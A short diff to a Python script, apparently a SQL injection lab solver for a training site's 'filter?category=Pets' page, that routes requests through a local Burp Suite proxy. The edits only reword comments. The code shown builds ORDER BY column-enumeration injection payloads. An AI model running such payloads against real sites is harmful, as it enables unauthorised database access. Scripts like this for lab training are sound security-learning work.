@@ -5,7 +5,7 @@ import sys
 import urllib3
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
-# Set proxies & path
+# You want to see each request in Burp Suite's proxy. Thus, force that.
 proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}
 path = "filter?category=Pets"
 
@@ -13,7 +13,8 @@ path = "filter?category=Pets"
 # Discover the number of columns
 def enumerate_columns(url):
     """
-    Iterate through the number of columns in the SQLi query
+    Iterate through the number of columns in the SQLi query using the ORDER by clause
+    It's easier, (uses less code), to use the ORDER by when scripting in this context.
     """
     for i in range(1,50):
         sql_payload = "'+order+by+%s--" %i
